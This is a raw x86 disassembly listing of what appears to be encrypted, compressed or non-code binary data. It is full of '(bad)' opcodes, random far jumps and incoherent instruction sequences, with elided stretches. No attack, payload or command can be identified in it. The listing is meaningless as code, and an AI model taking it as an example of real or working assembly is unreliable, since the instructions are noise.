  429f56:	add    BYTE PTR [ecx+0x28],bh
  429f59:	(bad)  
  429f5b:	cmc    
  429f5c:	jecxz  0x429f44
  429f5e:	addr16 pextrw ebx,(bad),0xc5
  429f61:	sbb    ebp,esi
  429f63:	bound  edx,QWORD PTR [edi-0x1d]
  429f66:	pop    ss
  429f67:	cmp    DWORD PTR [eax-0x350e292],ecx
	...
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx+0x2498bb3c]
  429fe6:	jl     0x429fa9
  429fe8:	add    DWORD PTR [eax],eax
  429fea:	inc    DWORD PTR [eax]
  429fec:	add    BYTE PTR [eax],al
  429fee:	pop    ebx
  429fef:	add    dl,ah
  429ff1:	or     al,0x45
  429ff3:	and    cl,bh
  429ff5:	xchg   esi,eax
  429ff6:	stos   BYTE PTR es:[edi],al
  429ff7:	mov    edi,0x886da9f3
  429ffc:	mov    eax,edx
  429ffe:	(bad)  
  429fff:	xor    BYTE PTR [eax-0x6072e30e],bh
  42a005:	scas   al,BYTE PTR es:[edi]
  42a006:	adc    BYTE PTR [edi+0x699a44b2],bh
  42a00c:	pslld  mm2,mm6
  42a00f:	shl    BYTE PTR [esi+0x24],0x4e
  42a013:	pop    eax
  42a014:	les    esi,FWORD PTR [ecx-0x54244d92]
  42a01a:	fdivr  QWORD PTR [ebx]
  42a01c:	shl    DWORD PTR [ecx],1
  42a01e:	arpl   WORD PTR [ecx+0x72],cx
  42a021:	push   0x88b011c9
  42a026:	imul   ecx,esi,0x5a
  42a029:	je     0x42a094
  42a02b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a02c:	(bad)
  42a030:	mov    ds:0x73706efc,eax
  42a035:	inc    ebp
  42a036:	sbb    edi,ecx
  42a038:	pop    ebp
  42a039:	sub    dh,ch
  42a03b:	fs aaa 
  42a03d:	lods   eax,DWORD PTR ds:[esi]
  42a03e:	mov    eax,0xd8a2a080
  42a043:	mov    bl,0x84
  42a045:	mov    BYTE PTR [edi],al
  42a047:	or     BYTE PTR [esi-0x69],0xde
  42a04b:	outs   dx,BYTE PTR ds:[esi]
  42a04c:	not    BYTE PTR [ecx+0x4b]
  42a04f:	sub    eax,edx
  42a051:	and    dh,bl
  42a053:	cmp    eax,0x4d484e56
  42a058:	jae    0x42a037
  42a05a:	xor    eax,DWORD PTR [edx+0x75]
  42a05d:	or     esi,esp
  42a05f:	pop    ds
  42a060:	fsub   QWORD PTR [esi+0x7]
  42a063:	popa   
  42a064:	sub    eax,0xb3f487aa
  42a069:	add    BYTE PTR [edi-0x55],bl
  42a06c:	sub    al,0x6e
  42a06e:	xor    DWORD PTR [esi],edi
  42a070:	and    eax,0xb0ae40ac
  42a075:	cdq    
  42a076:	mov    edx,ebx
  42a078:	in     al,0x1a
  42a07a:	sahf   
  42a07b:	stos   BYTE PTR es:[edi],al
  42a07c:	sbb    eax,0xa2fb488f
  42a081:	cwde   
  42a082:	ss enter 0x6a8a,0x9b
  42a087:	pop    esp
  42a088:	dec    ebp
  42a089:	call   DWORD PTR [ebx-0x6756f72e]
  42a08f:	add    BYTE PTR [ebx+0x25ae75eb],cl
  42a095:	fidiv  DWORD PTR ds:0x9db4b73d
  42a09b:	fs nop
  42a09d:	xchg   ebx,eax
  42a09e:	in     al,0x0
  42a0a0:	pop    ss
  42a0a1:	jmp    0x7164:0x1d803fbc
  42a0a8:	sub    al,0x62
  42a0aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a0ab:	mov    cl,ch
  42a0ad:	pop    ebp
  42a0ae:	mov    ebp,0xa2cce10f
  42a0b3:	dec    ebx
  42a0b4:	mov    al,0x96
  42a0b6:	jae    0x42a11f
  42a0b8:	xchg   esp,eax
  42a0b9:	sub    BYTE PTR [edi+0xe31c81],0x8a
  42a0c0:	inc    esp
  42a0c1:	jbe    0x42a11a
  42a0c3:	jbe    0x42a092
  42a0c5:	or     eax,0x9b5490f2
  42a0ca:	pop    esi
  42a0cb:	dec    eax
  42a0cc:	(bad)  
  42a0cd:	pop    ss
  42a0ce:	mov    al,ds:0xeea25528
  42a0d3:	jmp    FWORD PTR [edx+0x66]
  42a0d6:	adc    dl,BYTE PTR [esi]
  42a0d8:	and    DWORD PTR ss:[ecx],edx
  42a0db:	push   ebp
  42a0dc:	mov    esi,0xc7194044
  42a0e1:	and    eax,esi
  42a0e3:	js     0x42a144
  42a0e5:	fs jno 0x42a0c2
  42a0e8:	aaa    
  42a0e9:	sub    bh,ah
  42a0eb:	outs   dx,BYTE PTR ds:[esi]
  42a0ec:	jbe    0x42a0ee
	...
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	xor    al,0xea
  42a164:	and    BYTE PTR [ebx+edi*2-0xfffe3e],ah
  42a16b:	add    BYTE PTR [eax],al
  42a16d:	add    al,dl
  42a16f:	mov    ebx,DWORD PTR [ebp-0x793ff3c2]
  42a175:	inc    ecx
  42a176:	add    DWORD PTR [ebx+ebx*8+0x72],ecx
  42a17a:	push   0x501b95fa
  42a17f:	mov    ecx,0x292f8dbe
  42a184:	(bad)  
  42a185:	shl    BYTE PTR [edx],0x48
  42a188:	fwait
  42a189:	out    0x2,al
  42a18b:	sub    eax,0xce90a20
  42a190:	ja     0x42a1ed
  42a192:	jmp    DWORD PTR ds:0x674e939c
  42a198:	shl    DWORD PTR [edi],0xb6
  42a19b:	mov    ebp,0x30aca651
  42a1a0:	and    dh,BYTE PTR [esi]
  42a1a2:	outs   dx,BYTE PTR ds:[esi]
  42a1a3:	pusha  
  42a1a4:	and    edi,DWORD PTR [edx]
  42a1a6:	sub    al,0x9e
  42a1a8:	(bad)
  42a1ab:	xchg   esp,eax
  42a1ac:	pop    ds
  42a1ad:	mov    ds:0x5bcb1bf5,eax
  42a1b2:	mov    eax,0x1238113a
  42a1b8:	xchg   esi,eax
  42a1b9:	pop    ss
  42a1ba:	sbb    BYTE PTR [eax],ch
  42a1bc:	mov    ecx,edi
  42a1be:	retf   
  42a1bf:	jb     0x42a152
  42a1c1:	or     dh,BYTE PTR [edx-0x4d82b1d2]
  42a1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1c8:	pop    eax
  42a1c9:	mov    cl,0x15
  42a1cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1cc:	cld    
  42a1cd:	(bad)  
  42a1ce:	mov    bh,0xfc
  42a1d0:	ds or  eax,0x94c50b9f
  42a1d6:	jae    0x42a23b
  42a1d8:	fisubr WORD PTR [esi+ecx*4]
  42a1db:	out    dx,eax
  42a1dc:	lods   eax,DWORD PTR ds:[esi]
  42a1dd:	inc    ebx
  42a1de:	mov    DWORD PTR [edi-0xb6e80a5],esp
  42a1e4:	and    al,0xca
  42a1e6:	icebp  
  42a1e7:	rcr    DWORD PTR [ecx],0x0
  42a1ea:	mov    ebx,0x89b7f87a
  42a1ef:	dec    edx
  42a1f0:	xchg   edx,eax
  42a1f1:	pop    ebp
  42a1f2:	jne    0x42a1df
  42a1f4:	call   0x2f07d6f3
  42a1f9:	(bad)  
  42a1fb:	dec    ebp
  42a1fc:	imul   ebp,DWORD PTR [edi-0xabbcf29],0x58
  42a203:	push   esp
  42a204:	dec    edi
  42a205:	add    eax,0xf1949203
  42a20a:	add    dh,BYTE PTR [ebp*4+0x7764a423]
  42a211:	jp     0x42a1f1
  42a213:	inc    edx
  42a214:	aam    0xff
  42a216:	aam    0xd8
  42a218:	and    DWORD PTR [ebp+0x1c],ecx
  42a21b:	out    dx,al
  42a21c:	fnsave [eax+0x13]
  42a21f:	das    
  42a220:	cmp    edi,DWORD PTR [esi-0x2b]
  42a223:	jl     0x42a29e
  42a225:	mov    dh,0x74
  42a227:	xchg   esp,eax
  42a228:	add    DWORD PTR ds:0xa0a070f,esp
  42a22e:	cwde   
  42a22f:	mov    ebx,0x98972a80
  42a234:	mov    eax,0xc2721839
  42a239:	jae    0x42a23c
  42a23b:	addr16 jl 0x42a205
  42a23e:	mov    BYTE PTR [edi],bh
  42a240:	outs   dx,DWORD PTR ds:[esi]
  42a241:	push   ebx
  42a242:	bound  esi,QWORD PTR [edx-0x38992c1]
  42a248:	addr16 push 0x4f
  42a24b:	jle    0x42a1f2
  42a24d:	mov    dl,0xae
  42a24f:	icebp  
  42a250:	sbb    al,0x98
  42a252:	cmp    eax,0x3fbe85d9
  42a257:	push   esp
  42a258:	inc    ebx
  42a259:	cmp    esi,DWORD PTR [edi]
  42a25b:	mov    ebp,0x5234dc6c
  42a260:	ror    BYTE PTR [eax-0x663b7d5a],cl
  42a266:	out    dx,eax
  42a267:	retf   0x937e
  42a26a:	cmp    al,bl
  42a26c:	ins    BYTE PTR es:[edi],dx
	...
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fnstenv [esi]
  42a2e3:	(bad)
  42a2e6:	jp     0x42a2ab
  42a2e8:	add    DWORD PTR [eax],eax
  42a2ea:	inc    DWORD PTR [eax]
  42a2ec:	add    BYTE PTR [eax],al
  42a2ee:	push   es
  42a2ef:	xor    ebp,DWORD PTR [ecx-0x5]
  42a2f2:	(bad)  [eax-0x76]
  42a2f5:	into   
  42a2f6:	pop    esi
  42a2f7:	push   edx
  42a2f8:	mov    esi,DWORD PTR [eax]
  42a2fa:	mov    eax,0x52f6355e
  42a2ff:	js     0x42a2f1
  42a301:	ret    
  42a302:	jnp    0x42a349
  42a304:	int    0xab
  42a306:	cmp    DWORD PTR [ecx-0x771d8a48],edi
  42a30c:	pop    esi
  42a30d:	xor    BYTE PTR ds:0x29c1e0b,dh
  42a313:	cwde   
  42a314:	idiv   BYTE PTR [eax-0x7c]
  42a317:	pop    ebx
  42a318:	popa   
  42a319:	or     bh,BYTE PTR ds:0x10b61069
  42a31f:	mov    DWORD PTR [esi+0x17],ebp
  42a322:	sub    BYTE PTR [ebx],al
  42a324:	dec    esi
  42a325:	sub    dh,BYTE PTR [edx+eiz*1+0x4e]
  42a329:	lahf   
  42a32a:	(bad)  
  42a32b:	xchg   ecx,eax
  42a32c:	loope  0x42a315
  42a32e:	sub    eax,0x9c897db6
  42a333:	mov    ds:0xcb19bd6c,al
  42a338:	fild   WORD PTR [ecx-0x76]
  42a33b:	xor    BYTE PTR [esi-0x73],dh
  42a33e:	enter  0x25ea,0xdd
  42a342:	stc    
  42a343:	iret   
  42a344:	movaps xmm4,XMMWORD PTR [ecx]
  42a347:	scas   al,BYTE PTR es:[edi]
  42a348:	jecxz  0x42a2f4
  42a34a:	dec    ebp
  42a34b:	iret   
  42a34c:	xor    bh,bh
  42a34e:	in     al,dx
  42a34f:	stos   BYTE PTR es:[edi],al
  42a350:	mov    ds:0x9c9b4d59,al
  42a355:	mov    WORD PTR [ebx],?
  42a357:	pop    es
  42a358:	popf   
  42a359:	pcmpgtw mm0,QWORD PTR [esi-0x55c69306]
  42a360:	fstp   DWORD PTR [edi-0x398f8484]
  42a366:	pusha  
  42a367:	cmp    bl,dl
  42a369:	lock push edi
  42a36b:	in     eax,dx
  42a36c:	stos   BYTE PTR es:[edi],al
  42a36d:	js     0x42a38c
  42a36f:	scas   al,BYTE PTR es:[edi]
  42a370:	push   ecx
  42a371:	icebp  
  42a372:	enter  0xb32e,0xd2
  42a376:	xor    ebp,ebp
  42a378:	push   cs
  42a379:	inc    edx
  42a37a:	or     cl,BYTE PTR [edx+ebx*2]
  42a37d:	popa   
  42a37e:	retf   
  42a37f:	fstp   QWORD PTR [esi]
  42a381:	fdiv   QWORD PTR [eax+0x10c24786]
  42a387:	xchg   esi,eax
  42a388:	xchg   edx,eax
  42a389:	es leave 
  42a38b:	sub    eax,0xaf713a40
  42a390:	scas   al,BYTE PTR es:[edi]
  42a391:	xchg   esi,eax
  42a392:	fld    st(4)
  42a394:	sahf   
  42a395:	int    0xf9
  42a397:	sub    DWORD PTR [edi+0x5ba44f2d],0xffffffe1
  42a39e:	dec    esi
  42a39f:	scas   al,BYTE PTR es:[edi]
  42a3a0:	in     eax,dx
  42a3a1:	and    al,0xbc
  42a3a3:	fisttp DWORD PTR [ebp-0x465592f9]
  42a3a9:	pop    eax
  42a3aa:	popf   
  42a3ab:	pop    edx
  42a3ac:	mov    ch,0xbc
  42a3ae:	or     al,0xe
  42a3b0:	push   ebx
  42a3b1:	in     al,0xeb
  42a3b3:	dec    esi
  42a3b4:	rcl    DWORD PTR ds:0xee3fafde,1
  42a3ba:	inc    edx
  42a3bb:	push   ds
  42a3bc:	je     0x42a39b
  42a3be:	push   esp
  42a3bf:	jg     0x42a408
  42a3c1:	int    0x66
  42a3c3:	or     ch,ch
  42a3c5:	cld    
  42a3c6:	xor    eax,0x4acf40d9
  42a3cb:	aas    
  42a3cc:	stos   BYTE PTR es:[edi],al
  42a3cd:	jne    0x42a425
  42a3cf:	aas    
  42a3d0:	adc    DWORD PTR [ecx+0x4284af0e],ebp
  42a3d6:	mov    ebp,0x715296b2
  42a3db:	in     eax,0xc7
  42a3dd:	pop    edi
  42a3de:	or     al,0x81
  42a3e0:	aaa    
  42a3e1:	aas    
  42a3e2:	xchg   BYTE PTR [eax+0x44],bl
  42a3e5:	push   cs
  42a3e6:	scas   eax,DWORD PTR es:[edi]
  42a3e7:	mov    ?,edx
  42a3e9:	stos   DWORD PTR es:[edi],eax
  42a3ea:	lods   eax,DWORD PTR ds:[esi]
  42a3eb:	xchg   edx,eax
  42a3ec:	fld    DWORD PTR [eax]
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x9f8ae73d
  42a465:	aas    
  42a466:	jns    0x42a42c
  42a468:	add    DWORD PTR [eax],eax
  42a46a:	inc    DWORD PTR [eax]
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	loop   0x42a4b1
  42a470:	push   edx
  42a471:	outs   dx,BYTE PTR ds:[esi]
  42a472:	es ins DWORD PTR es:[edi],dx
  42a474:	sub    cl,BYTE PTR [esi+0x25]
  42a477:	jmp    0x2316:0x5c7ee897
  42a47e:	mov    bh,0xdd
  42a480:	cmp    DWORD PTR [edx],ebp
  42a482:	aaa    
  42a483:	icebp  
  42a484:	shl    DWORD PTR [edi+0x4a],1
  42a487:	stc    
  42a488:	and    eax,0xeba8bac5
  42a48d:	loop   0x42a42f
  42a48f:	aas    
  42a490:	test   edx,ebx
  42a492:	mov    ds:0xd254369e,al
  42a497:	(bad)  
  42a498:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a49a:	push   ecx
  42a49b:	sub    DWORD PTR [ebx+0x2f627ec8],ebp
  42a4a1:	inc    edi
  42a4a2:	pop    es
  42a4a3:	sti    
  42a4a4:	(bad)  
  42a4a5:	aaa    
  42a4a6:	sub    al,0x38
  42a4a8:	add    DWORD PTR [ecx+0x9],ecx
  42a4ab:	stos   BYTE PTR es:[edi],al
  42a4ac:	sbb    eax,0x5e49f83e
  42a4b1:	(bad)  
  42a4b3:	shl    DWORD PTR [esi],0x61
  42a4b6:	xor    al,0x41
  42a4b8:	ins    DWORD PTR es:[edi],dx
  42a4b9:	jo     0x42a486
  42a4bb:	and    BYTE PTR [bp-0x78],dl
  42a4bf:	jnp    0x42a4c5
  42a4c1:	loopne 0x42a471
  42a4c3:	inc    eax
  42a4c4:	cwde   
  42a4c5:	pusha  
  42a4c6:	into   
  42a4c7:	or     eax,0x141faf63
  42a4cc:	xchg   BYTE PTR [eax+0x46aab12d],bh
  42a4d2:	or     BYTE PTR [ebx],al
  42a4d4:	adc    eax,0x14869ca5
  42a4d9:	call   0x45cc:0xce17e583
  42a4e0:	mov    BYTE PTR [ecx],dl
  42a4e2:	xchg   ecx,eax
  42a4e4:	adc    BYTE PTR [eax+0x79],dl
  42a4e7:	push   edx
  42a4e8:	rcl    DWORD PTR [eax+0x199ad6a0],0xa0
  42a4ef:	sbb    ah,BYTE PTR [edx-0x409dce07]
  42a4f5:	dec    esp
  42a4f6:	shr    edi,0xe2
  42a4f9:	push   0xffffffee
  42a4fb:	push   eax
  42a4fc:	out    0x6f,eax
  42a4fe:	imul   eax,DWORD PTR [edx],0xf3533173
  42a504:	sub    al,0x1b
  42a507:	jno    0x42a4fa
  42a509:	xchg   BYTE PTR [edx],dh
  42a50b:	sbb    dh,al
  42a50d:	sub    ecx,edx
  42a50f:	fisttp WORD PTR [eax+ebp*8]
  42a512:	sbb    eax,0xe9581032
  42a517:	push   cs
  42a518:	mov    esp,0x8081be02
  42a51d:	je     0x42a565
  42a51f:	cmp    BYTE PTR [edx-0x76],0x43
  42a523:	leave  
  42a524:	arpl   WORD PTR ds:0xe0069666,sp
  42a52a:	mov    ah,0x2e
  42a52d:	(bad)  ds:0x1f92c5f4
  42a533:	shl    BYTE PTR ds:0xb3b02ddd,1
  42a539:	xchg   ebx,eax
  42a53a:	push   eax
  42a53b:	pop    edi
  42a53c:	mov    ah,0xa3
  42a53e:	fs call 0xee318203
  42a544:	sub    eax,0xad58beda
  42a549:	pop    ebp
  42a54a:	les    edi,FWORD PTR [ecx]
  42a54c:	jb     0x42a582
  42a54e:	sub    al,0xfd
  42a550:	in     eax,0x7
  42a552:	cmp    eax,0xc30c7c7e
  42a557:	imul   edi,DWORD PTR [eax-0x3c7a158a],0xffffffff
  42a55e:	pop    ss
  42a55f:	pusha  
  42a560:	retf   0xc66e
  42a563:	mov    ebp,DWORD PTR [edi-0x70]
  42a566:	dec    esp
  42a567:	ins    BYTE PTR es:[edi],dx
  42a568:	repz xchg ecx,eax
  42a56a:	push   eax
  42a56b:	mul    DWORD PTR [ecx]
	...
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0xc8c5e89f
  42a5e5:	xchg   esi,eax
  42a5e6:	js     0x42a5ad
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	inc    DWORD PTR [eax]
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	push   ss
  42a5ef:	or     bh,BYTE PTR [ebx+ecx*8-0x328c1b76]
  42a5f6:	(bad)  
  42a5f7:	(bad)  
  42a5f8:	cdq    
  42a5f9:	push   ecx
  42a5fa:	xchg   ebx,eax
  42a5fb:	pop    esi
  42a5fc:	inc    eax
  42a5fd:	fs jmp 0xe8563eee
  42a603:	clc    
  42a604:	fidivr DWORD PTR [edx+0x5f]
  42a607:	add    ah,BYTE PTR [esi+0x43c47246]
  42a60d:	sub    ch,BYTE PTR [ecx-0x516a05cc]
  42a613:	jae    0x42a66a
  42a615:	arpl   WORD PTR [eax],cx
  42a617:	inc    esi
  42a618:	inc    edi
  42a61a:	fidivr WORD PTR [ebx-0x2ae9db33]
  42a620:	inc    eax
  42a621:	xor    edx,eax
  42a623:	fistp  DWORD PTR [ebx+0xa]
  42a626:	mov    al,0x22
  42a628:	push   eax
  42a629:	call   0x56bcd0ce
  42a62e:	daa    
  42a62f:	jae    0x42a5b1
  42a631:	add    eax,0xcb5da4f2
  42a636:	ret    
  42a637:	sbb    ecx,esp
  42a639:	xchg   esi,eax
  42a63a:	sbb    DWORD PTR [eax-0x7e],esi
  42a63d:	lods   eax,DWORD PTR ds:[esi]
  42a63e:	xor    edx,ebp
  42a640:	into   
  42a641:	xor    edx,DWORD PTR [eax+0x183f118b]
  42a647:	(bad)  
  42a648:	sub    DWORD PTR [ecx],ebx
  42a64a:	pop    ds
  42a64b:	(bad)  
  42a64c:	push   0xffffff89
  42a64e:	and    esp,0x673a40ca
  42a654:	xchg   ebp,eax
  42a655:	js     0x42a626
  42a657:	push   0xffffffb8
  42a659:	jmp    0xac88:0xa2184f2e
  42a660:	pushf  
  42a661:	push   ebp
  42a662:	add    cl,al
  42a664:	pusha  
  42a665:	(bad)  
  42a666:	adc    esi,DWORD PTR [esi+0x5c]
  42a669:	cmp    DWORD PTR [edx],esi
  42a66b:	xchg   edx,eax
  42a66c:	mov    dl,0xa1
  42a66e:	dec    esi
  42a66f:	scas   al,BYTE PTR es:[edi]
  42a670:	xor    dl,al
  42a672:	ja     0x42a6d4
  42a674:	add    eax,0x7739569c
  42a679:	push   0x8a10e7b7
  42a67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a67f:	jne    0x42a696
  42a681:	out    dx,al
  42a682:	cmp    eax,0xb8e1bc04
  42a687:	add    eax,0x1b8ff925
  42a68c:	mov    DWORD PTR [ebx],esi
  42a68e:	jno    0x42a6be
  42a690:	inc    ecx
  42a691:	clc    
  42a692:	xchg   ebp,eax
  42a693:	lock ss in eax,0xea
  42a697:	iret   
  42a698:	lock inc BYTE PTR [edx-0x17]
  42a69c:	pop    ss
  42a69d:	inc    DWORD PTR [edi-0x2688de3e]
  42a6a3:	retf   
  42a6a4:	mov    cl,BYTE PTR [ebx]
  42a6a6:	int3   
  42a6a7:	and    eax,0x41689e2c
  42a6ac:	jle    0x42a6e9
  42a6ae:	sub    ebx,edx
  42a6b0:	test   BYTE PTR [ecx+0x5c],dh
  42a6b3:	outs   dx,BYTE PTR ds:[esi]
  42a6b4:	popf   
  42a6b5:	outs   dx,BYTE PTR ds:[esi]
  42a6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a6b7:	shl    DWORD PTR [esi-0x3e],cl
  42a6ba:	jo     0x42a645
  42a6bc:	out    0x18,eax
  42a6be:	or     DWORD PTR [esi-0x38],edi
  42a6c1:	jns    0x42a6b3
  42a6c3:	mov    dl,0xa2
  42a6c5:	ret    0x1591
  42a6c8:	je     0x42a662
  42a6ca:	shr    DWORD PTR [ebx-0x376bcc94],1
  42a6d0:	dec    esp
  42a6d1:	lea    ecx,[ebx-0x1f7a2d1b]
  42a6d7:	cmp    ecx,eax
  42a6d9:	aam    0x85
  42a6db:	fidivr DWORD PTR [ebx+0xb]
  42a6de:	jl     0x42a680
  42a6e0:	pop    esi
  42a6e1:	(bad)  
  42a6e2:	xchg   edi,eax
  42a6e3:	je     0x42a6c7
  42a6e5:	mov    bh,0xf1
  42a6e7:	clc    
  42a6e8:	push   esi
  42a6e9:	dec    ecx
  42a6ea:	push   ss
  42a6eb:	cmp    ebx,DWORD PTR ds:0x0
	...
  42a755:	add    BYTE PTR [esi+edx*1],ah
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x4a47ece4],0x771bee17
  42a767:	mov    BYTE PTR [ecx],0x0
  42a76a:	inc    DWORD PTR [eax]
  42a76c:	add    BYTE PTR [eax],al
  42a76e:	and    eax,0xce11a421
  42a773:	shr    edi,1
  42a775:	shr    BYTE PTR [edx-0x256f0e4f],1
  42a77b:	mov    ds:0x9354bade,al
  42a780:	fs pop edi
  42a782:	sbb    eax,0x2a6007
  42a787:	arpl   WORD PTR [esi-0xee88c77],bp
  42a78d:	xchg   DWORD PTR [esi+eax*8+0x5c],ebp
  42a791:	cmp    ebp,0xe505be48
  42a797:	fsubr  st,st(5)
  42a799:	sbb    al,0xda
  42a79b:	cmp    edi,edi
  42a79d:	inc    edx
  42a79e:	mov    bl,0x1
  42a7a0:	cmc    
  42a7a1:	fisubr WORD PTR [ebp+0x70]
  42a7a4:	sar    BYTE PTR gs:[ebx-0x2285423e],cl
  42a7ab:	cmc    
  42a7ac:	mov    edx,0x48a4485e
  42a7b1:	jg     0x42a7e9
  42a7b3:	arpl   WORD PTR [edi],sp
  42a7b5:	into   
  42a7b6:	ins    DWORD PTR es:[edi],dx
  42a7b7:	dec    esi
  42a7b8:	dec    esp
  42a7b9:	fneni(8087 only) 
  42a7bb:	xchg   esi,eax
  42a7bc:	and    al,0x35
  42a7be:	ss mov esp,0xf39ed5d4
  42a7c4:	fcmovu st,st(2)
  42a7c6:	dec    ecx
  42a7c7:	cdq    
  42a7c8:	push   ebx
  42a7c9:	and    dl,0x1
  42a7cc:	xchg   ecx,eax
  42a7cd:	ss sub cl,ch
  42a7d0:	adc    eax,0x50e8f03b
  42a7d5:	sti    
  42a7d6:	loope  0x42a803
  42a7d8:	aaa    
  42a7d9:	push   ss
  42a7da:	jmp    0xca95:0x78c9cd38
  42a7e1:	dec    ebx
  42a7e2:	jne    0x42a856
  42a7e4:	sbb    DWORD PTR [ebx+0x3d673ebb],ebp
  42a7ea:	xor    eax,0xf7301f39
  42a7ef:	push   ebp
  42a7f0:	xchg   ebx,eax
  42a7f1:	pop    es
  42a7f2:	mov    db2,esp
  42a7f5:	sbb    DWORD PTR [edx-0x5b],esi
  42a7f8:	push   esi
  42a7f9:	sub    al,0x42
  42a7fb:	out    0x54,eax
  42a7fd:	jmp    0xb6ea19d3
  42a802:	aaa    
  42a803:	(bad)  
  42a804:	push   esi
  42a805:	xchg   ebx,eax
  42a806:	push   esp
  42a807:	and    al,0xf6
  42a809:	cmp    ebp,DWORD PTR [edx+0x56]
  42a80c:	jae    0x42a860
  42a80e:	arpl   WORD PTR [esi+0x5a25c63c],si
  42a814:	pop    ecx
  42a815:	pop    ecx
  42a816:	shl    BYTE PTR [edi+esi*4],cl
  42a819:	call   0x7f0aafd1
  42a81e:	icebp  
  42a81f:	xchg   esp,eax
  42a820:	push   0x68
  42a822:	jbe    0x42a827
  42a824:	pop    esp
  42a825:	leave  
  42a826:	push   edx
  42a827:	push   ecx
  42a828:	shl    DWORD PTR [esi],cl
  42a82a:	out    dx,eax
  42a82b:	(bad)  
  42a82c:	mov    esi,0x45da835e
  42a831:	xor    bl,BYTE PTR [ebx]
  42a833:	hlt    
  42a834:	mov    ch,0x7d
  42a836:	out    dx,al
  42a837:	sti    
  42a838:	dec    ebp
  42a839:	test   DWORD PTR ds:0x252d0a8e,edi
  42a83f:	cmp    dh,BYTE PTR [ecx-0x4f]
  42a842:	pop    eax
  42a843:	fwait
  42a844:	xor    esp,DWORD PTR [edx]
  42a846:	adc    eax,0x3f7be985
  42a84b:	push   edi
  42a84c:	repnz pop es
  42a84e:	pop    es
  42a84f:	jns    0x42a8aa
  42a851:	int3   
  42a852:	in     al,dx
  42a853:	fcomi  st,st(3)
  42a855:	lea    edx,[ebp+0x1ad947f4]
  42a85b:	into   
  42a85c:	imul   ebp,DWORD PTR [esi],0xffffffdc
  42a85f:	push   esi
  42a860:	mov    al,0xca
  42a862:	hlt    
  42a863:	inc    ebx
  42a864:	sub    BYTE PTR [eax],ch
  42a866:	mov    al,0xb0
  42a868:	jb     0x42a8b3
  42a86a:	es (bad) 
  42a86c:	cwde   
	...
  42a8d5:	add    BYTE PTR [edx-0x10409c9b],cl
  42a8db:	mov    edi,0xc58175de
  42a8e0:	xchg   edi,eax
  42a8e1:	ins    BYTE PTR es:[edi],dx
  42a8e2:	and    DWORD PTR [edi-0x7f],ecx
  42a8e5:	outs   dx,BYTE PTR ds:[esi]
  42a8e6:	jbe    0x42a8af
  42a8e8:	add    DWORD PTR [eax],eax
  42a8ea:	inc    DWORD PTR [eax]
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	sbb    esp,esp
  42a8f0:	push   ss
  42a8f1:	pop    ds
  42a8f2:	mov    ecx,gs
  42a8f4:	sbb    DWORD PTR [ebp+0x7667060a],esp
  42a8fa:	mov    al,0x34
  42a8fc:	push   ss
  42a8fd:	mov    BYTE PTR [edx+0x3f],dl
  42a900:	jle    0x42a95b
  42a902:	and    eax,0x4cabb16c
  42a907:	add    al,0x82
  42a909:	out    dx,eax
  42a90a:	mov    ch,0x12
  42a90c:	mov    esi,0xd6bec88f
  42a911:	mov    ecx,0x85acc3f6
  42a916:	sbb    BYTE PTR ss:[eax],ah
  42a919:	in     al,0xa4
  42a91b:	fwait
  42a91c:	mov    ecx,0xb959a620
  42a921:	xchg   ebp,eax
  42a922:	and    eax,0xe3101c38
  42a927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a928:	push   ecx
  42a929:	pop    esp
  42a92a:	jb     0x42a946
  42a92c:	or     al,0x58
  42a92e:	pop    ebx
  42a92f:	add    al,0xbb
  42a931:	xchg   esi,eax
  42a932:	not    BYTE PTR ds:0x9a3f4bbc
  42a938:	cmp    esp,eax
  42a93a:	push   0xffffff81
  42a93c:	fild   WORD PTR [ebx-0x6a]
  42a93f:	push   0x8c1ebd5e
  42a944:	cmp    BYTE PTR [ebx],dl
  42a946:	out    dx,al
  42a947:	or     eax,0xf1df7a1f
  42a94c:	leave  
  42a94d:	jl     0x42a986
  42a94f:	scas   eax,DWORD PTR es:[edi]
  42a950:	adc    BYTE PTR [edi-0x3feaafa8],al
  42a956:	clc    
  42a957:	cmp    bl,BYTE PTR [ebx-0x53]
  42a95a:	dec    edx
  42a95b:	fld    QWORD PTR [edx-0x74]
  42a95e:	in     eax,0x60
  42a960:	rol    BYTE PTR ds:0xb049283c,1
  42a966:	cmp    bh,BYTE PTR [ecx-0x3d028fd8]
  42a96c:	shl    BYTE PTR [ebx+0x262de9bd],1
  42a972:	sub    al,BYTE PTR [esi+edx*4+0x3]
  42a976:	sbb    BYTE PTR [ebx],al
  42a978:	push   ebx
